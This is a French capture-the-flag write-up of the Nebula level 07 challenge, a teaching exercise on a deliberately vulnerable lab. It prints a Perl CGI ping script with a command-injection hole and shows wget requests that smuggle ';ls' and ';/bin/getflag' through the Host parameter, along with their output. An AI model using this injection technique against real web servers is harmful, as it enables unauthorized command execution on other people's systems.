# Challenge 07

Dans ce challenge on apprends que l'utilisateur `flag07` a écrit son premier programme Perl pour ping des utilisateurs.
On a accès au code source :
```bash
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```
De plus le répertoire n'est pas vide :
```bash
level07@nebula:/home/flag07$ ls -la
total 10
drwxr-x--- 2 flag07 level07  102 2011-11-20 20:39 .
drwxr-xr-x 1 root   root     140 2012-08-27 07:18 ..
-rw-r--r-- 1 flag07 flag07   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag07 flag07  3353 2011-05-18 02:54 .bashrc
-rwxr-xr-x 1 root   root     368 2011-11-20 21:22 index.cgi
-rw-r--r-- 1 flag07 flag07   675 2011-05-18 02:54 .profile
-rw-r--r-- 1 root   root    3719 2011-11-20 21:22 thttpd.conf
```

*Rappel : `thttpd.conf` est le fichier de configuration de thttpd (web serveur)*

Fonctionnement :
1. Le programme affiche le texte `Content-type: text/html`.
2. L'argument donné au programme est stocké dans `$host`
3. Le programme affiche : `<html><head><title>Ping results</title></head><body><pre>`
4. Execute ce qui est entre \`\` dans un shell et stocke la sortie standard de cette execution dans `output`
    - Comme on a `2>&1` toutes les erreurs seront stockées aussi
5. Parcourt chaque ligne de `output` ( càd de la sortie ) et l'affiche
6. Affiche `</pre></body></html>` et ferme les balises HTML
7. `ping(param("Host"))` : récupère le paramètre `Host` envoyé par l'utilisateur via la requête HTTP (query GET ou data de POST) et passe directement cela à la requête ping.

### Exploitation

On reconnait imédiatement une commande injection classique.
On va essayer d'interragir avec le serveur. Pour cela je vais lire le fichier de configuration :
```bash
level07@nebula:/home/flag07$ cat thttpd.conf | grep port
# Specifies an alternate port number to listen on.
port=7007
```

On a donc le port qui nous interresse. Malheuresement `curl` n'est pas installé. Au lieu d'essayer de l'installer (on a pas les permissions) on va utiliser wget avec une option pour outrepasser cela.

**Utile : utiliser `wget -O -` pour utiliser wget et ecrire l'output dans le stdout**

Ce qui nous donne :
```bash
level07@nebula:/home/flag07$ wget -O - "http://localhost:7007/index.cgi"
--2026-09-27 05:53:57--  http://localhost:7007/index.cgi
Resolving localhost... 127.0.0.1
Connecting to localhost|127.0.0.1|:7007... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: STDOUT'

    [<=>                                                                                                                                                                         ] 0           --.-K/s              <html><head><title>Ping results</title></head><body><pre>Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
            [-T tstamp-options] [-Q tos] [hop1 ...] destination
    [ <=>                                                                                                                                                                        ] 328'         --.-K/s   in 0s      

2026-09-27 05:53:57 (960 KB/s) - written to stdout [328]
```

Essayons maintenant un ping classique sur `127.0.0.1` :
```bash
level07@nebula:/home/flag07$ wget -O - "http://localhost:7007/index.cgi?Host=127.0.0.1"
--2026-09-27 05:56:25--  http://localhost:7007/index.cgi?Host=127.0.0.1
Resolving localhost... 127.0.0.1
Connecting to localhost|127.0.0.1|:7007... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: STDOUT'

    [<=>                                                                                                                                                                         ] 0           --.-K/s              <    [  <=>                                                                                                                                                                       ] 57          --.-K/s              PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.010 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.027 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.025 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.010/0.020/0.027/0.009 ms
    [   <=>                                                                                                                                                                      ]' 445          222B/s   in 2.0s    

2026-09-27 05:56:27 (222 B/s) - written to stdout [445]
```

On voit bien que la commande ping a bien été executée comme prévue.
Et si on essaye d'exploiter cela ?

Par exemple en envoyant :`127.0.0.1;ls` ?

*Rappel : Ne pas oublier URL Encode  `;` en `%3B`* 

```bash
level07@nebula:/home/flag07$ wget -O - "http://localhost:7007/index.cgi?Host=127.0.0.1%3Bls"
--2026-09-27 05:58:36--  http://localhost:7007/index.cgi?Host=127.0.0.1%3Bls
Resolving localhost... 127.0.0.1
Connecting to localhost|127.0.0.1|:7007... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: STDOUT'

    [<=>                                                                                                                                                                         ] 0           --.-K/s              <    [  <=>                                                                                                                                                                       ] 57          --.-K/s              PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.008 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.046 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.045 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.008/0.033/0.046/0.017 ms
index.cgi
thttpd.conf
    [   <=>                                                                                                                                                                      ]' 467          233B/s   in 2.0s    

2026-09-27 05:58:38 (233 B/s) - written to stdout [467]
```

On voit bien que notre commande a été executée.
Il nous reste plus qu'à executer le `getflag` :

```bash
level07@nebula:/home/flag07$ wget -O - "http://localhost:7007/index.cgi?Host=127.0.0.1%3B/bin/getflag"
--2026-09-27 06:00:57--  http://localhost:7007/index.cgi?Host=127.0.0.1%3B/bin/getflag
Resolving localhost... 127.0.0.1
Connecting to localhost|127.0.0.1|:7007... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: STDOUT'

    [<=>                                                                                                                                                                         ] 0           --.-K/s              <    [  <=>                                                                                                                                                                       ] 57          --.-K/s              PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.006 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.042 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.045 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.006/0.031/0.045/0.017 ms
You have successfully executed getflag on a target account
    [   <=>                                                                                                                                                                      ]' 504          252B/s   in 2.0s    

2026-09-27 06:00:59 (252 B/s) - written to stdout [504]
```

Bingo on a bien executé le getflag avec les bonnes permissions !